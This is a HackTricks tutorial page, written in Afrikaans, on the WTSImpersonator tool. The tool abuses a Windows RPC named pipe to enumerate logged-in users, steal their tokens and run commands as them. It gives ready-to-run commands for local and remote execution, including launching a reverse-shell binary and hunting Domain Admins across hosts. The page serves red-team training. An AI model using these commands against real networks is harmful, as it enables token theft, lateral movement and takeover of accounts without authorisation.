{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Die **WTS Impersonator** hulpmiddel benut die **"\\pipe\LSM_API_service"** RPC Named pipe om stilweg ingelogde gebruikers te tel en hul tokens te kapen, terwyl dit tradisionele Token Impersonation tegnieke omseil. Hierdie benadering fasiliteer naatlose laterale bewegings binne netwerke. Die innovasie agter hierdie tegniek word toegeskryf aan **Omri Baso, wie se werk beskikbaar is op [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.

### Kernfunksionaliteit
Die hulpmiddel werk deur 'n reeks API-oproepe:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Sleutelmodules en Gebruik
- **Opname van Gebruikers**: Plaaslike en afstandlike gebruiker opname is moontlik met die hulpmiddel, met opdragte vir enige van die scenario's:
- Plaaslik:
```powershell
.\WTSImpersonator.exe -m enum
```
- Afstandlik, deur 'n IP-adres of gasheernaam te spesifiseer:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Uitvoering van Opdragte**: Die `exec` en `exec-remote` modules vereis 'n **Diens** konteks om te funksioneer. Plaaslike uitvoering benodig eenvoudig die WTSImpersonator uitvoerbare lêer en 'n opdrag:
- Voorbeeld vir plaaslike opdrag uitvoering:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe kan gebruik word om 'n diens konteks te verkry:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Afstandlike Opdrag Uitvoering**: Betrek die skep en installering van 'n diens afstandlik soortgelyk aan PsExec.exe, wat uitvoering met toepaslike regte toelaat.
- Voorbeeld van afstandlike uitvoering:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Gebruiker Jag Module**: Teiken spesifieke gebruikers oor verskeie masjiene, wat kode onder hul kredensiale uitvoer. Dit is veral nuttig om Domein Administrators met plaaslike administratiewe regte op verskeie stelsels te teiken.
- Gebruik voorbeeld:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Ondersteun HackTricks</summary>

* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
